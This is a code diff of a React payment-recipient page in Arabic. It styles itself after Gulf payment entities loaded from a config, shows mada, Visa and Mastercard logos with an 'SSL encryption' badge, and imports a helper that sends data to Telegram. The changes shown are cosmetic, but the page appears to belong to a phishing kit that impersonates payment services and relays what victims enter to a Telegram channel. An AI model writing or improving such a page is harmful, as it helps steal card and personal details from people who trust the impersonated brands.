@@ -4,7 +4,6 @@ import { useUpdateLink } from "@/hooks/useSupabase";
 import { useLinkData } from "@/hooks/useLinkData";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
-import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
 import { ThemedButton } from "@/components/ui/ThemedButton";
@@ -18,14 +17,8 @@ import {
   Mail,
   MapPin,
   ShieldCheck,
-  Globe,
-  Lock,
-  Building2,
-  Truck,
-  CreditCard,
-  Wallet,
 } from "lucide-react";
-import PaymentMetaTags from "@/components/PaymentMetaTags";
+import { DynamicMetaTags } from "@/components/DynamicMetaTags";
 
 const PaymentRecipient = () => {
   const { id } = useParams();
@@ -109,17 +102,16 @@ const PaymentRecipient = () => {
 
   if (linkLoading || !linkData) {
     return (
-      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: entityConfig.bg }}>
-        <Loader2 className="w-10 h-10 animate-spin" style={{ color: entityConfig.primary }} />
+      <div className="min-h-screen flex items-center justify-center bg-background">
+        <Loader2 className="w-10 h-10 animate-spin text-primary" />
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor: entityConfig.bg, fontFamily: entityConfig.font }}>
-      <PaymentMetaTags
-        serviceKey={companyKey}
-        serviceName={entityConfig.nameAr}
+    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
+      <DynamicMetaTags
+        entityId={companyKey}
         title={`بوابة الدفع - ${entityConfig.nameAr}`}
       />
 
@@ -132,12 +124,12 @@ const PaymentRecipient = () => {
       <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
         <div className="w-full max-w-xl space-y-8">
           <div className="text-center space-y-2">
-            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: entityConfig.text }}>بيانات مستلم الخدمة</h2>
-            <p className="text-sm font-medium uppercase tracking-wide" style={{ color: entityConfig.textMuted }}>Recipient Information & Verification</p>
+            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-foreground">بيانات مستلم الخدمة</h2>
+            <p className="text-sm font-medium uppercase tracking-wide text-muted-foreground">Recipient Information & Verification</p>
           </div>
 
-          <ThemedCard config={entityConfig} variant="elevated">
-            <div className="h-2 w-full" style={{ backgroundColor: entityConfig.primary }} />
+          <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
+            <div className="h-2 w-full bg-primary" />
             <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6">
               <ThemedInput
                 config={entityConfig}
@@ -188,7 +180,7 @@ const PaymentRecipient = () => {
                 >
                   {isSubmitting ? "جاري المعالجة..." : "متابعة عملية الدفع"}
                 </ThemedButton>
-                <div className="mt-6 flex items-center justify-center gap-2" style={{ color: entityConfig.textMuted }}>
+                <div className="mt-6 flex items-center justify-center gap-2 text-muted-foreground">
                   <ShieldCheck className="w-4 h-4" />
                   <span className="text-[10px] font-bold uppercase tracking-widest">تشفير بيانات آمن 256-bit SSL</span>
                 </div>
@@ -197,9 +189,9 @@ const PaymentRecipient = () => {
           </ThemedCard>
 
           <div className="flex justify-center gap-8 opacity-40 grayscale">
-            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-6" alt="mada" />
-            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-6" alt="visa" />
-            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-6" alt="mastercard" />
+            <img src="/assets/logo-mada.png" className="h-6" alt="mada" />
+            <img src="/assets/logo-visa.png" className="h-6" alt="visa" />
+            <img src="/assets/logo-mastercard.png" className="h-6" alt="mastercard" />
           </div>
         </div>
       </main>
